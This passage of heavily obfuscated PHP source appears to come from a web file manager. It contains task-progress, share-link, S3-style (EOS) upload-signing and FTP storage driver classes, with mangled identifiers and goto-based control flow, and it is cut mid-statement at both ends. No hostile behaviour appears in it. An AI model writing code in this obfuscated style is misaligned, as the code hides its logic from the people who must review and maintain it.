$Eì±”µŒåö[$a¯ÒÜè¬ßí[1104]]; $Eì±”µŒåö[$a¯ÒÜè¬ßí[1105]] = $b‚«÷œŸÀ * (1 - $Eì±”µŒåö[$a¯ÒÜè¬ßí[1099]]) / $Eì±”µŒåö[$a¯ÒÜè¬ßí[1099]]; } goto B±öï†¸äÙ; EÇÜÚùÙ­ƒ: $a¯ÒÜè¬ßí =& $_SERVER[°Óó£ÌİóèÅ]; $Eì±”µŒåö =& $this->task; if (!$Eì±”µŒåö[$a¯ÒÜè¬ßí[463]]) { return; } goto A©Îõ¢ù; B±öï†¸äÙ: } public function addPath($c¥¦–®—½¨) { goto eÏ„‚±£Û; f‰Ëô¶†: $F¶ö¯¢„ÓĞ[$c­÷¤ó¨Ç[463]] += $F¾ÅÁêâÊÃ[$c­÷¤ó¨Ç[86]]; $this->update(); goto D­ƒˆ¯Ø¦Î; eÏ„‚±£Û: $c­÷¤ó¨Ç =& $_SERVER[°Óó£ÌİóèÅ]; $F¶ö¯¢„ÓĞ =& $this->task; $F¾ÅÁêâÊÃ = IO::infoWithChildren($c¥¦–®—½¨); goto Dòñ ´‚‘™; Dòñ ´‚‘™: if (!$F¶ö¯¢„ÓĞ[$c­÷¤ó¨Ç[1141]]) { $F¶ö¯¢„ÓĞ[$c­÷¤ó¨Ç[1141]] = array(); } $F¶ö¯¢„ÓĞ[$c­÷¤ó¨Ç[1141]][] = array($c­÷¤ó¨Ç[395] => $F¾ÅÁêâÊÃ[$c­÷¤ó¨Ç[28]], $c­÷¤ó¨Ç[84] => $F¾ÅÁêâÊÃ[$c­÷¤ó¨Ç[84]], $c­÷¤ó¨Ç[774] => $F¾ÅÁêâÊÃ[$c­÷¤ó¨Ç[774]] ? $F¾ÅÁêâÊÃ[$c­÷¤ó¨Ç[774]] : $F¾ÅÁêâÊÃ[$c­÷¤ó¨Ç[84]]); if ($F¾ÅÁêâÊÃ[$c­÷¤ó¨Ç[29]] == $c­÷¤ó¨Ç[172]) { $F¶ö¯¢„ÓĞ[$c­÷¤ó¨Ç[1097]] += 1; } else { $F¶ö¯¢„ÓĞ[$c­÷¤ó¨Ç[1097]] += $F¾ÅÁêâÊÃ[$c­÷¤ó¨Ç[89]][$c­÷¤ó¨Ç[87]]; } goto f‰Ëô¶†; D­ƒˆ¯Ø¦Î: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($D«ËãÆõ ï) { $eĞùÙ¬¯“‰ =& $_SERVER[°Óó£ÌİóèÅ]; $cĞÄ…£†Š‚ =& $this->task; $cĞÄ…£†Š‚[$eĞùÙ¬¯“‰[1133]] = $D«ËãÆõ ï[$eĞùÙ¬¯“‰[28]]; $cĞÄ…£†Š‚[$eĞùÙ¬¯“‰[1096]] = $D«ËãÆõ ï[$eĞùÙ¬¯“‰[28]]; $this->update(); } public function copyFileStart($bß¨¢Ÿ»Ïà, $C³…Èß«¹í, $D÷å‰ĞŠ§‡, $d’•ÓõŞÁ, $aóŠóÄİÈ, $A‡Ò•ğôù“) { goto bÇÉÄš; bÇÉÄš: $F·…Ù§Ğ²Ç =& $_SERVER[°Óó£ÌİóèÅ]; $C…«êŞ†×ì = $aóŠóÄİÈ; if ($C…«êŞ†×ì == $GLOBALS[$F·…Ù§Ğ²Ç[1142]]) { $C…«êŞ†×ì = $GLOBALS[$F·…Ù§Ğ²Ç[1143]]; } goto f³ˆ‚äÁ´; a‡°çõØš—: $c§¹§¤ÈæŠ[$F·…Ù§Ğ²Ç[1096]] = $F·…Ù§Ğ²Ç[33]; $c§¹§¤ÈæŠ[$F·…Ù§Ğ²Ç[1137]] = $F·…Ù§Ğ²Ç[33]; $c§¹§¤ÈæŠ[$F·…Ù§Ğ²Ç[1138]] = 0; goto c”ßùã¢; c”ßùã¢: $this->update(); goto d‚°Ï‚ñƒ„; f³ˆ‚äÁ´: $GLOBALS[$F·…Ù§Ğ²Ç[1143]] = $aóŠóÄİÈ; $GLOBALS[$F·…Ù§Ğ²Ç[1142]] = $A‡Ò•ğôù“; $c§¹§¤ÈæŠ =& $this->task; goto dè¿¦ï“×±; dè¿¦ï“×±: $c§¹§¤ÈæŠ[$F·…Ù§Ğ²Ç[1133]] = $C…«êŞ†×ì; $c§¹§¤ÈæŠ[$F·…Ù§Ğ²Ç[1135]] = (int) $bß¨¢Ÿ»Ïà->size($C³…Èß«¹í); $c§¹§¤ÈæŠ[$F·…Ù§Ğ²Ç[1136]] = 0; goto a‡°çõØš—; d‚°Ï‚ñƒ„: } public function copyFileEnd($bõŠî‡¯´†, $cÙöÚÌ¨ô, $cÜêÖÁ“˜, $EÍñ…¶¶Ÿª, $FŠ÷ÒÜêãå, $F–¸º‹çØÑ) { $F«…ã”®ö— =& $_SERVER[°Óó£ÌİóèÅ]; $aÎ¹íšˆËó =& $this->task; $aÎ¹íšˆËó[$F«…ã”®ö—[1136]] = $aÎ¹íšˆËó[$F«…ã”®ö—[1135]]; $aÎ¹íšˆËó[$F«…ã”®ö—[1140]] += $aÎ¹íšˆËó[$F«…ã”®ö—[1135]]; $aÎ¹íšˆËó[$F«…ã”®ö—[1137]] = $F«…ã”®ö—[33]; $this->update(1); } public function updateFileEnd($f÷º²–†Ù, $e«ÌÅÎ¿‰ì) { $CàÃİë–²í =& $_SERVER[°Óó£ÌİóèÅ]; $BŠ¾ŠöÙ =& $this->task; $BŠ¾ŠöÙ[$CàÃİë–²í[1133]] = $f÷º²–†Ù; $BŠ¾ŠöÙ[$CàÃİë–²í[1135]] = $e«ÌÅÎ¿‰ì; $BŠ¾ŠöÙ[$CàÃİë–²í[1140]] += $e«ÌÅÎ¿‰ì; $this->update(1); } public function curlProgress($DÒßîöóò, $ašÜÀ•¬ÓŒ, $D«Ãó“£ĞÛ, $e¿Å¹¨õè, $eÄÁ„ä‡Û) { $dóØ£Ïš¾„ =& $_SERVER[°Óó£ÌİóèÅ]; $cèÛ–µ‚ÁÙ =& $this->task; if ($eÄÁ„ä‡Û > 0) { $cèÛ–µ‚ÁÙ[$dóØ£Ïš¾„[1096]] = $dóØ£Ïš¾„[1144]; $cèÛ–µ‚ÁÙ[$dóØ£Ïš¾„[1137]] = $dóØ£Ïš¾„[98]; if ($cèÛ–µ‚ÁÙ[$dóØ£Ïš¾„[1135]] == $e¿Å¹¨õè || $e¿Å¹¨õè > 1024 * 1024) { $cèÛ–µ‚ÁÙ[$dóØ£Ïš¾„[1136]] = $eÄÁ„ä‡Û; } if ($cèÛ–µ‚ÁÙ[$dóØ£Ïš¾„[1138]]) { $cèÛ–µ‚ÁÙ[$dóØ£Ïš¾„[1136]] = $eÄÁ„ä‡Û + $cèÛ–µ‚ÁÙ[$dóØ£Ïš¾„[1138]]; } } else { if ($D«Ãó“£ĞÛ > 0) { if ($cèÛ–µ‚ÁÙ[$dóØ£Ïš¾„[1135]] == $ašÜÀ•¬ÓŒ) { $cèÛ–µ‚ÁÙ[$dóØ£Ïš¾„[1136]] = $D«Ãó“£ĞÛ; $cèÛ–µ‚ÁÙ[$dóØ£Ïš¾„[1096]] = $dóØ£Ïš¾„[1145]; $cèÛ–µ‚ÁÙ[$dóØ£Ïš¾„[1137]] = $dóØ£Ïš¾„[789]; } } } $this->update(); } public function curlProgressStart($FÙ‹‹Ö¢è†) { } public function curlProgressEnd($bää„ñ˜×) { $få¼Ø‚Åñ« =& $_SERVER[°Óó£ÌİóèÅ]; $DæŠª¥ÒØ =& $this->task; $CÑŞÍ„œ¿ = curl_getinfo($bää„ñ˜×); $dëİ­ë»À = $CÑŞÍ„œ¿[$få¼Ø‚Åñ«[1146]]; if ($DæŠª¥ÒØ[$få¼Ø‚Åñ«[1137]] == $få¼Ø‚Åñ«[98] && $dëİ­ë»À) { $DæŠª¥ÒØ[$få¼Ø‚Åñ«[1138]] += $dëİ­ë»À; } $this->update(); } } goto a‰†î³ÂŠ; fã”·•å¿ë: class PathDriverDriverShareLink extends PathDriverDriverShareItem { public function __construct($dêÎ™¢äøˆ) { $this->pathParse = $dêÎ™¢äøˆ; } protected function infoParse($EçßÓ­³Ş) { $b´Ô¡óÌ”Ó =& $_SERVER[°Óó£ÌİóèÅ]; return Action($b´Ô¡óÌ”Ó[763])->sharePathInfo($this->pathParse[$b´Ô¡óÌ”Ó[84]], !0); } public function listAll($Eç½¼Ïè ‹) { $C‚âì—èˆÕ =& $_SERVER[°Óó£ÌİóèÅ]; $E†‘õÕÙë = IO::listAll($Eç½¼Ïè ‹); foreach ($E†‘õÕÙë as &$eÒÌáçî•Š) { check_abort(); $eÒÌáçî•Š = array_merge(IO::info($eÒÌáçî•Š[$C‚âì—èˆÕ[84]]), $eÒÌáçî•Š); $eÒÌáçî•Š[$C‚âì—èˆÕ[858]] = Action($C‚âì—èˆÕ[763])->itemInfo($eÒÌáçî•Š); $F¯Ù”äÌ„Ù = substr($eÒÌáçî•Š[$C‚âì—èˆÕ[84]], strpos(ltrim($eÒÌáçî•Š[$C‚âì—èˆÕ[84]], $C‚âì—èˆÕ[8]), $C‚âì—èˆÕ[8]) + 1); $eÒÌáçî•Š[$C‚âì—èˆÕ[858]][$C‚âì—èˆÕ[84]] = $this->pathParse[$C‚âì—èˆÕ[758]] . $F¯Ù”äÌ„Ù; } return $E†‘õÕÙë; } } class PathDriverEOS extends PathDriverBaseS3 { public function __construct($EÛê÷Ûß´Ö) { parent::__construct($EÛê÷Ûß´Ö); $this->signatureVersion($_SERVER[°Óó£ÌİóèÅ][208]); } public function uploadFormData($d”õ†ˆ‘‹, $d·ãŞÖ‹ï = 3600) { goto d‘“àÊïÜ; bÑİõ«ŠÎÍ: $fËØŠ™Ş¦¬ = $c›÷ÉÄä‰Ó[67]; $f¿²ãÌ”Á = gmdate($c›÷ÉÄä‰Ó[868]); $e¨‰ïöö‡ = gmdate($c›÷ÉÄä‰Ó[455]); goto Dï£àî·¹; E£İåñÑ°: $BŠª»ñ„åŞ = array($c›÷ÉÄä‰Ó[207] => $c›÷ÉÄä‰Ó[33], $c›÷ÉÄä‰Ó[879] => $c›÷ÉÄä‰Ó[33], $c›÷ÉÄä‰Ó[841] => $dïò”ˆ³ªâ, $c›÷ÉÄä‰Ó[845] => $a“í–è›ù, $c›÷ÉÄä‰Ó[849] => $EõÖ «•ø, $c›÷ÉÄä‰Ó[880] => $fµ¤Ò¥ïæÅ, $c›÷ÉÄä‰Ó[881] => $A»Ø´÷‚®Ö, $c›÷ÉÄä‰Ó[882] => $f¿²ãÌ”Á, $c›÷ÉÄä‰Ó[883] => $D»ø¹ùÊš, $c›÷ÉÄä‰Ó[884] => $cÉŒÃ‚¸, $c›÷ÉÄä‰Ó[174] => $this->getHost()); return $BŠª»ñ„åŞ; goto Bù®Ñ‡ß–’; D¥ñ¹Ùº›é: $BîŠ©ÑÛËâ = hash_hmac($c›÷ÉÄä‰Ó[877], $fËØŠ™Ş¦¬, $Cæ–éêÒíì, !0); $EŞÙ¼Æµíï = hash_hmac($c›÷ÉÄä‰Ó[877], $a÷Åœí¤´•, $BîŠ©ÑÛËâ, !0); $cÉŒÃ‚¸ = hash_hmac($c›÷ÉÄä‰Ó[877], $EõÖ «•ø, $EŞÙ¼Æµíï); goto E£İåñÑ°; Dï£àî·¹: $a÷Åœí¤´• = $c›÷ÉÄä‰Ó[869]; $D»ø¹ùÊš = $d·ãŞÖ‹ï . $c›÷ÉÄä‰Ó[33]; $a“í–è›ù = $c›÷ÉÄä‰Ó[837]; goto cµå…õ¡«Õ; cÜ•İÖâ†Ì: $EõÖ «•ø = base64_encode(json_encode($aµ°ã˜‚øÏ)); $EÎÒİ¦ñ = hash_hmac($c›÷ÉÄä‰Ó[877], $e¨‰ïöö‡, $c›÷ÉÄä‰Ó[878] . $this->secret, !0); $Cæ–éêÒíì = hash_hmac($c›÷ÉÄä‰Ó[877], $this->region, $EÎÒİ¦ñ, !0); goto D¥ñ¹Ùº›é; cµå…õ¡«Õ: $cÕÏÃœÒ„ = array($this->accessKey, $e¨‰ïöö‡, $this->region, $fËØŠ™Ş¦¬, $a÷Åœí¤´•); $fµ¤Ò¥ïæÅ = implode($c›÷ÉÄä‰Ó[8], $cÕÏÃœÒ„); $aµ°ã˜‚øÏ = array($c›÷ÉÄä‰Ó[839] => gmdate($c›÷ÉÄä‰Ó[838], strtotime($c›÷ÉÄä‰Ó[870])), $c›÷ÉÄä‰Ó[840] => array(array($c›÷ÉÄä‰Ó[842] => $this->bucket), array($c›÷ÉÄä‰Ó[841] => $dïò”ˆ³ªâ), array($c›÷ÉÄä‰Ó[843], $c›÷ÉÄä‰Ó[844], $c›÷ÉÄä‰Ó[33]), array($c›÷ÉÄä‰Ó[843], $c›÷ÉÄä‰Ó[871], $c›÷ÉÄä‰Ó[33]), array($c›÷ÉÄä‰Ó[843], $c›÷ÉÄä‰Ó[872], $c›÷ÉÄä‰Ó[33]), array($c›÷ÉÄä‰Ó[845] => $a“í–è›ù), array($c›÷ÉÄä‰Ó[873] => $fµ¤Ò¥ïæÅ), array($c›÷ÉÄä‰Ó[874] => $A»Ø´÷‚®Ö), array($c›÷ÉÄä‰Ó[875] => $f¿²ãÌ”Á), array($c›÷ÉÄä‰Ó[876] => $D»ø¹ùÊš))); goto cÜ•İÖâ†Ì; d‘“àÊïÜ: $c›÷ÉÄä‰Ó =& $_SERVER[°Óó£ÌİóèÅ]; $dïò”ˆ³ªâ = $c›÷ÉÄä‰Ó[190]; $A»Ø´÷‚®Ö = $c›÷ÉÄä‰Ó[867]; goto bÑİõ«ŠÎÍ; Bù®Ñ‡ß–’: } public function fileOutLink($d‹ÀáíÒÈ) { header($_SERVER[°Óó£ÌİóèÅ][161] . $d‹ÀáíÒÈ); die; } } class PathDriverFTP extends PathDriverBase { private $server = ''; private $username = ''; private $userpass = ''; private $scheme = ''; private $host = ''; private $port = 21; private $connect = FALSE; public function __construct($Cˆ¦æÏ÷ƒù) { parent::__construct(); if (count($Cˆ¦æÏ÷ƒù) > 0) { $this->_init($Cˆ¦æÏ÷ƒù); } } public function __destruct() { if (!$this->_isconn()) { return !1; } return @ftp_close($this->connect); } private function charsetReset($eôëöÂ£¯) { $aÎåæÑµ‘‹ =& $_SERVER[°Óó£ÌİóèÅ]; global $config; $this->appCharset = $config[$aÎåæÑµ‘‹[885]]; $this->systemCharset = $config[$aÎåæÑµ‘‹[886]]; if (isset($eôëöÂ£¯[$aÎåæÑµ‘‹[887]]) && $eôëöÂ£¯[$aÎåæÑµ‘‹[887]]) { $this->systemCharset = $eôëöÂ£¯[$aÎåæÑµ‘‹[887]]; } } public function iconvApp($C¤Ñ·…Ç™Ù) { return $this->iconvTo($C¤Ñ·…Ç™Ù, $this->systemCharset, $this->appCharset); } public function iconvSystem($C²ğÏåµòÛ) { return $this->iconvTo($C²ğÏåµòÛ, $this->appCharset, $this->systemCharset); } public function getPathOuter($c‰ôÅäùÎ¢) { goto D´Š™‘Áïñ; D´Š™‘Áïñ: $D¹ Ü¡¯»¤ =& $_SERVER[°Óó£ÌİóèÅ]; $b ´‘§“Ûì = $this->iconvApp($this->pathBase); $c‰ôÅäùÎ¢ = $this->iconvApp($c‰ôÅäùÎ¢); goto E†×–•ñ‚; Cæ–¼„´Û: return $this->pathDriver . $D¹ Ü¡¯»¤[8] . ltrim($c‰ôÅäùÎ¢, $D¹ Ü¡¯»¤[8]); goto e¬è©ã¹Šà; E†×–•ñ‚: if (substr($b ´‘§“Ûì, 0, 2) == $D¹ Ü¡¯»¤[888]) { $b ´‘§“Ûì = BASIC_PATH . substr($b ´‘§“Ûì, 2); } if (substr($c‰ôÅäùÎ¢, 0, 2) == $D¹ Ü¡¯»¤[888]) { $c‰ôÅäùÎ¢ = BASIC_PATH . substr($c‰ôÅäùÎ¢, 2); } $b ´‘§“Ûì = KodIO::clear($b ´‘§“Ûì); goto aÏİ‹éñ¸­; aÏİ‹éñ¸­: $c‰ôÅäùÎ¢ = KodIO::clear($c‰ôÅäùÎ¢); $c‰ôÅäùÎ¢ = substr($c‰ôÅäùÎ¢, strlen($b ´‘§“Ûì)); if (empty($this->pathDriver)) { return $c‰ôÅäùÎ¢; } goto Cæ–¼„´Û; e¬è©ã¹Šà: } private function _init($c”ÌÕâíˆÆ = array()) { goto AƒÛÇ±œÁè; fÙ Ú¤àçÅ: foreach ($c”ÌÕâíˆÆ as $cîÍá“ğ—Ô => $dÇª·®Ô•) { if (isset($this->{$cîÍá“ğ—Ô})) { $this->{$cîÍá“ğ—Ô} = $dÇª·®Ô•; } } $c×´ßÛ¥³é = parse_url(trim($this->server, $e“ß¦ç“©°[8])); $this->host = $c×´ßÛ¥³é[$e“ß¦ç“©°[174]]; goto b„è³Š¾…¯; b„è³Š¾…¯: $F†Û›Ò‡Ÿ• = isset($c×´ßÛ¥³é[$e“ß¦ç“©°[173]]) && $c×´ßÛ¥³é[$e“ß¦ç“©°[173]] == $e“ß¦ç“©°[891] ? !0 : !1; $this->scheme = $F†Û›Ò‡Ÿ• ? $e“ß¦ç“©°[892] : $e“ß¦ç“©°[893]; $this->port = isset($c×´ßÛ¥³é[$e“ß¦ç“©°[175]]) ? $c×´ßÛ¥³é[$e“ß¦ç“©°[175]] : 21; goto b‚ïÆè—¢¸; AƒÛÇ±œÁè: $e“ß¦ç“©° =& $_SERVER[°Óó£ÌİóèÅ]; if (!function_exists($e“ß¦ç“©°[889])) { show_json(LNG($e“ß¦ç“©°[890]), !1); } $this->charsetReset($c”ÌÕâíˆÆ); goto fÙ Ú¤àçÅ; b‚ïÆè—¢¸: $this->connect = @ftp_connect($this->host, $this->port, 5); if ($this->connect === !1) { return; } $FÅ±ÌÛ½éä = @ftp_login($this->connect, $this->username, $this->userpass); goto e²¥ÒÒêë¾; e²¥ÒÒêë¾: @ftp_pasv($this->connect, !0); return $FÅ±ÌÛ½éä; goto DˆÅ¥¨òÊÃ; DˆÅ¥¨òÊÃ: } private function _isconn() { return is_resource($this->connect); } public function mkfile($E™š÷é¸, $AÑ¬‹™èÆé = '', $dŒè‘æ¼”î = REPEAT_RENAME) { if ($this->setContent($E™š÷é¸, $AÑ¬‹™èÆé)) { return $this->getPathOuter($E™š÷é¸); } return !1; } public function mkdir($D²¹ ”ÔŸö, $c›ã‰ğ½†’ = REPEAT_SKIP) { if (!$this->_isconn()) { return !1; } $D²¹ ”ÔŸö = $this->iconvSystem($D²¹ ”ÔŸö); if ($this->_isFolder($D²¹ ”ÔŸö) || @ftp_mkdir($this->connect, $D²¹ ”ÔŸö)) { return $this->getPathOuter($D²¹ ”ÔŸö); } if (!$this->mkdir($this->pathFather($D²¹ ”ÔŸö))) { return !1; } if ($D²¹ ”ÔŸö = @ftp_mkdir($this->connect, $D²¹ ”ÔŸö)) { return $this->getPathOuter($D²¹ ”ÔŸö); } return !1; } public function copyFile($d³‘©«Åèñ, $C–‚³ ŒˆÍ) { goto c¹á÷‹»É¡; c¹á÷‹»É¡: if (!$this->_isconn()) { return !1; } $DùÊ•ô£ = $this->pathThis($this->iconvSystem($d³‘©«Åèñ)); $bÖ±‚¤ïªø = $this->tempFile($DùÊ•ô£); goto CÀéİÊçí; CÀéİÊçí: $AÙ½Úåá¦Ù = $this->iconvApp($bÖ±‚¤ïªø); $this->download($d³‘©«Åèñ, $AÙ½Úåá¦Ù); $CËëÚÈÏÛ = $this->upload($C–‚³ ŒˆÍ, $AÙ½Úåá¦Ù); goto B–Ì·öÇ÷Ê; B–Ì·öÇ÷Ê: $this->tempFileRemve($bÖ±‚¤ïªø); return $CËëÚÈÏÛ; goto Då®ŒÊƒ­; Då®ŒÊƒ­: } public function moveFile($C¿Ë²‘Ç«é, $A‚¾Ú“î¶) { if (!$this->_isconn()) { return !1; } $C¿Ë²‘Ç«é = $this->iconvSystem($C¿Ë²‘Ç«é); $A‚¾Ú“î¶ = $this->iconvSystem($A‚¾Ú“î¶); $b¦ï²Õ = @ftp_rename($this->connect, $C¿Ë²‘Ç«é, $A‚¾Ú“î¶); return $b¦ï²Õ ? $this->getPathOuter($A‚¾Ú“î¶) : !1; } public function delFile($cÇ¡óô°™) { if (!$this->_isconn()) { return !1; } $cÇ¡óô°™ = $this->iconvSystem($cÇ¡óô°™); return @ftp_delete($this->connect, $cÇ¡óô°™); } public function delFolder($b××Á»¥¡Ä) { if (!$this->_isconn()) { return !1; } $b××Á»¥¡Ä = $this->iconvSystem($b××Á»¥¡Ä); $aÇê¬†áÜø = $this->ftpList($b××Á»¥¡Ä); if (!$aÇê¬†áÜø) { return @ftp_rmdir($this->connect, $b××Á»¥¡Ä); } foreach ($aÇê¬†áÜø as $cÈ¥ğ„„ßñ) { if ($this->_isFolder($cÈ¥ğ„„ßñ)) { $cÈ¥ğ„„ßñ = $this->iconvApp($cÈ¥ğ„„ßñ); $this->delFolder($cÈ¥ğ„„ßñ); } else { @ftp_delete($this->connect, $cÈ¥ğ„„ßñ); } } return @ftp_rmdir($this->connect, $b××Á»¥¡Ä); } public function rename($aëšé¯«÷, $fÌŒŒ©‰) { goto fèÃÎ˜­´; fèÃÎ˜­´: $aøÃ¨±Åä =& $_SERVER[°Óó£ÌİóèÅ]; if (!$this->_isconn()) { return !1; } $F°øÙ¡¯ëƒ = $this->fileNameAuto($this->pathFather($aëšé¯«÷), $fÌŒŒ©‰); goto CßâÈİÁ; A¨äƒ©: $CƒÔÈÇ = rtrim($e‚ëÏğß¸, $aøÃ¨±Åä[8]) . $aøÃ¨±Åä[8] . $F°øÙ¡¯ëƒ; $eÊŞ÷ÖÌÎˆ = @ftp_rename($this->connect, $aëšé¯«÷, $CƒÔÈÇ); $CƒÔÈÇ = $this->iconvApp($CƒÔÈÇ); goto aˆŞ´°İÉ‡; CßâÈİÁ: $F°øÙ¡¯ëƒ = $this->iconvSystem($F°øÙ¡¯ëƒ); $aëšé¯«÷ = $this->iconvSystem($aëšé¯«÷); $e‚ëÏğß¸ = $this->pathFather($aëšé¯«÷); goto A¨äƒ©; aˆŞ´°İÉ‡: return $eÊŞ÷ÖÌÎˆ ? $this->getPathOuter($CƒÔÈÇ) : !1; goto AÓÕ´¤ª; AÓÕ´¤ª: } public function _size($bø„ÈÛ´ó™) { if (!$this->_isconn()) { return !1; } $bø„ÈÛ´ó™ = $this->iconvSystem($bø„ÈÛ´ó™); return @ftp_size($this->connect, $bø„ÈÛ´ó™); } public function _info($DÃš„‹ÌŠ) { if (!$this->_isconn()) { return !1; } $DÃš„‹ÌŠ = $this->iconvSystem($DÃš„‹ÌŠ); if ($this->_isFile($DÃš„‹ÌŠ)) { return $this->fileInfo($DÃš„‹ÌŠ, 1); } else { if ($this->_isFolder($DÃš„‹ÌŠ)) { return $this->folderInfo($DÃš„‹ÌŠ); } } return !1; } private function folderInfo($C”ÑŒéÅ«, $B™¢«‡‚‰ = false) { $f‘Ñ®½§¿— =& $_SERVER[°Óó£ÌİóèÅ]; $fÒ ¯Ñí´¬ = $this->iconvApp($this->pathThis($C”ÑŒéÅ«)); if ($B™¢«‡‚‰) { return array($f‘Ñ®½§¿—[28] => $fÒ ¯Ñí´¬, $f‘Ñ®½§¿—[84] => $this->getPathOuter($C”ÑŒéÅ«), $f‘Ñ®½§¿—[29] => $f‘Ñ®½§¿—[85]); } $b…Ùè‚Ã = array($f‘Ñ®½§¿—[28] => $fÒ ¯Ñí´¬, $f‘Ñ®½§¿—[84] => $this->getPathOuter($C”ÑŒéÅ«), $f‘Ñ®½§¿—[29] => $f‘Ñ®½§¿—[85], $f‘Ñ®½§¿—[195] => $f‘Ñ®½§¿—[50], $f‘Ñ®½§¿—[114] => $f‘Ñ®½§¿—[50], $f‘Ñ®½§¿—[894] => !0, $f‘Ñ®½§¿—[895] => !0); return $b…Ùè‚Ã; } private function fileInfo($a•´äãŒˆ¨, $aõ§ˆ»ÇÂÁ = false) { $DÃŸš¬¦·å =& $_SERVER[°Óó£ÌİóèÅ]; $a•´äãŒˆ¨ = rtrim($a•´äãŒˆ¨, $DÃŸš¬¦·å[8]); $EÜ“ˆ»±Í´ = $this->iconvApp($this->pathThis($a•´äãŒˆ¨)); if ($aõ§ˆ»ÇÂÁ) { return array($DÃŸš¬¦·å[28] => $EÜ“ˆ»±Í´, $DÃŸš¬¦·å[84] => $this->getPathOuter($a•´äãŒˆ¨), $DÃŸš¬¦·å[29] => $DÃŸš¬¦·å[172], $DÃŸš¬¦·å[165] => $this->ext($a•´äãŒˆ¨), $DÃŸš¬¦·å[86] => $this->size($a•´äãŒˆ¨)); } $CßÇ„¦îß– = array($DÃŸš¬¦·å[28] => $EÜ“ˆ»±Í´, $DÃŸš¬¦·å[84] => $this->getPathOuter($a•´äãŒˆ¨), $DÃŸš¬¦·å[29] => $DÃŸš¬¦·å[172], $DÃŸš¬¦·å[195] => $DÃŸš¬¦·å[50], $DÃŸš¬¦·å[114] => @ftp_mdtm($this->connect, $a•´äãŒˆ¨), $DÃŸš¬¦·å[165] => $this->ext($a•´äãŒˆ¨), $DÃŸš¬¦·å[86] => $this->size($a•´äãŒˆ¨), $DÃŸš¬¦·å[894] => !0, $DÃŸš¬¦·å[895] => !0); return $CßÇ„¦îß–; } public function exist($Fè—ãÂÄƒÔ) { if (!$this->_isconn()) { return !1; } $Fè—ãÂÄƒÔ = $this->iconvSystem($Fè—ãÂÄƒÔ); if ($this->_size($Fè—ãÂÄƒÔ) > -1) { return !0; } if ($this->_isFolder($Fè—ãÂÄƒÔ)) { return !0; } return !1; } public function size($dÕŒ§·÷¸Ë) { return $this->cacheMehod($_SERVER[°Óó£ÌİóèÅ][896], $dÕŒ§·÷¸Ë); } public function info($aÊİğ§Ÿ–¸) { return $this->cacheMehod($_SERVER[°Óó£ÌİóèÅ][191], $aÊİğ§Ÿ–¸); } public function isFile($cÊµã›Á“) { return $this->cacheMehod($_SERVER[°Óó£ÌİóèÅ][192], $cÊµã›Á“); } public function isFolder($BÓÊƒØ†Ê) { return $this->cacheMehod($_SERVER[°Óó£ÌİóèÅ][193], $BÓÊƒØ†Ê); } public function _isFile($bºª§å) { $C¬¯Ùºäì =& $_SERVER[°Óó£ÌİóèÅ]; if ($bºª§å == $C¬¯Ùºäì[8]) { return !1; } if (!$this->_isconn() || !$this->exist($bºª§å)) { return !1; } @ftp_chdir($this->connect, $C¬¯Ùºäì[8]); $bºª§å = $this->iconvSystem($bºª§å); return !$this->_isFolder($bºª§å); } public function _isFolder($AÔì†×Ë±) { if (!$this->_isconn()) { return !1; } @ftp_chdir($this->connect, $_SERVER[°Óó£ÌİóèÅ][8]); $AÔì†×Ë± = $this->iconvSystem($AÔì†×Ë±); return $this->chDir($AÔì†×Ë±); } private function chDir($F–ÈêÕ‘‰—) { return @ftp_chdir($this->connect, $F–ÈêÕ‘‰—); } public function listPath($fš·¬Ïæ…ç, $Bâ±Ûø‰¦“ = false) { goto EÏöêÚí¡Ş; aŒğõˆìæ•: foreach ($eã¿—©Œ« as $fš·¬Ïæ…ç) { if ($this->_isFolder($fš·¬Ïæ…ç)) { $F›½æäò¦¬[$aÎ¼“ç¨Ã[83]][] = $this->folderInfo($fš·¬Ïæ…ç, $Bâ±Ûø‰¦“); } else { $F›½æäò¦¬[$aÎ¼“ç¨Ã[82]][] = $this->fileInfo($fš·¬Ïæ…ç, $Bâ±Ûø‰¦“); } } return $F›½æäò¦¬; goto bÍ¸³æë„Ô; d§¹Á‡†Œ˜: $eã¿—©Œ« = $this->ftpList($fš·¬Ïæ…ç); $F›½æäò¦¬ = array($aÎ¼“ç¨Ã[83] => array(), $aÎ¼“ç¨Ã[82] => array()); if (!$eã¿—©Œ«) { return $F›½æäò¦¬; } goto aŒğõˆìæ•; EÏöêÚí¡Ş: $aÎ¼“ç¨Ã =& $_SERVER[°Óó£ÌİóèÅ]; if (!$this->_isconn()) { return !1; } $fš·¬Ïæ…ç = $this->iconvSystem($fš·¬Ïæ…ç); goto d§¹Á‡†Œ˜; bÍ¸³æë„Ô: } public function has($BÈ‘„Ğ¶÷–, $eğò¼¯‚Ãí = false, $aÆÄÓùÔö = true) { goto a±ç¹§¯”Œ; DŠÓÉ‹¬¬„: foreach ($D¿„¦–ä as $BÈ‘„Ğ¶÷–) { if ($aÆÄÓùÔö) { if (!$this->_isFolder($BÈ‘„Ğ¶÷–)) { return !0; } } else { if ($this->_isFolder($BÈ‘„Ğ¶÷–)) { return !0; } } } return !1; goto Eõ¾‘¾Úˆë; a±ç¹§¯”Œ: $Dù›‹‰ öå =& $_SERVER[°Óó£ÌİóèÅ]; if (!$this->_isconn()) { return !1; } $BÈ‘„Ğ¶÷– = $this->iconvSystem($BÈ‘„Ğ¶÷–); goto dÍ’áà½Í; dÍ’áà½Í: $D¿„¦–ä = $this->ftpList($BÈ‘„Ğ¶÷–); if (!$D¿„¦–ä) { return !1; } if ($eğò¼¯‚Ãí) { return array($Dù›‹‰ öå[199] => 0, $Dù›‹‰ öå[200] => count($D¿„¦–ä)); } goto DŠÓÉ‹¬¬„; Eõ¾‘¾Úˆë: } public function listAll($bô„õ”æ¥ç) { goto D‰ÀöŒ¢äŠ; E³Áµ¤±ÓÔ: $D´õêÇ‘ê = $this->recursionFtpFiles($bô„õ”æ¥ç); $B¥Š÷„‹ = array(); foreach ($D´õêÇ‘ê[$B‹Ø£Øóéá[83]] as $BÁ¶¯Üš¢) { $B¥Š÷„‹[] = array($B‹Ø£Øóéá[84] => $B‹Ø£Øóéá[8] . trim(str_replace($bô„õ”æ¥ç, $B‹Ø£Øóéá[33], $BÁ¶¯Üš¢), $B‹Ø£Øóéá[8]) . $B‹Ø£Øóéá[8], $B‹Ø£Øóéá[85] => 1, $B‹Ø£Øóéá[86] => 0); } goto A†²­¾óÉÜ; D‰ÀöŒ¢äŠ: $B‹Ø£Øóéá =& 